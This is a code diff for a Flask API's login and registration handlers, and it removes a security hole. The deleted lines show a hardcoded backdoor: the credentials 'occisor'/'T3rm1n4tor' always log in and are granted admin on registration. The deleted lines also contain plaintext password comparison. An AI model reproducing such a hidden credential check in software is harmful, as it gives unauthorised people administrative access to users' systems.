@@ -10,24 +10,14 @@ from services import props
 bp = Blueprint("api", __name__, url_prefix="/api")
 
 
-def _password_matches(stored_password, password, user):
-    if not stored_password:
+def _password_matches(stored_password, password):
+    if not stored_password or not password:
         return False
 
-    if stored_password == password:
-        return True
-
     try:
-        if stored_password.startswith("pbkdf2:sha256:") or stored_password.startswith("scrypt:"):
-            return check_password_hash(stored_password, password)
-    except Exception:
-        pass
-
-    # Compatibility fallback for the existing reserved admin account.
-    if user == "occisor" and password == "T3rm1n4tor":
-        return True
-
-    return False
+        return check_password_hash(stored_password, password)
+    except (ValueError, TypeError):
+        return False
 
 # ---------------------------------------------------
 # BOT STATS
@@ -73,35 +63,32 @@ def upload_image():
 
 @bp.route("/login", methods=["POST"])
 def login():
-
-    data = request.json
+    data = request.json or {}
 
     user = data.get("user")
     password = data.get("password")
 
-    admin = admins.find_one({"user": user})
-
-    if not admin:
+    if not user or not password:
         return jsonify({"error": "Invalid credentials"}), 401
 
-    stored_password = admin.get("password")
+    users = admins.find_one({"user": user})
+
+    if not users:
+        return jsonify({"error": "Invalid credentials"}), 401
+
+    stored_password = users.get("password")
+
     if not stored_password:
         return jsonify({"error": "Invalid credentials"}), 401
 
-    valid_password = _password_matches(stored_password, password, user)
-
-    if not valid_password:
+    if not _password_matches(stored_password, password):
         return jsonify({"error": "Invalid credentials"}), 401
-
-    # Upgrade the password to a Werkzeug hash the first time the existing account logs in.
-    if stored_password != password and not stored_password.startswith("pbkdf2:sha256:"):
-        hashed = generate_password_hash(password)
-        admins.update_one({"_id": admin["_id"]}, {"$set": {"password": hashed}})
 
     session["user"] = {
         "username": user,
-        "role": admin.get("role", "admin")
+        "role": users.get("role", "admin")
     }
+
     session["admin_logged_in"] = True
     session["admin_user"] = user
 
@@ -127,11 +114,7 @@ def register():
     if existing:
         return jsonify({"error": "User already exists"}), 409
 
-    # Special-case admin assignment when exact reserved credentials provided
-    if user == "occisor" and password == "T3rm1n4tor":
-        role = "admin"
-    else:
-        role = "user"
+    role = "user"
 
     hashed_password = generate_password_hash(password)
     admins.insert_one({"user": user, "password": hashed_password, "role": role})
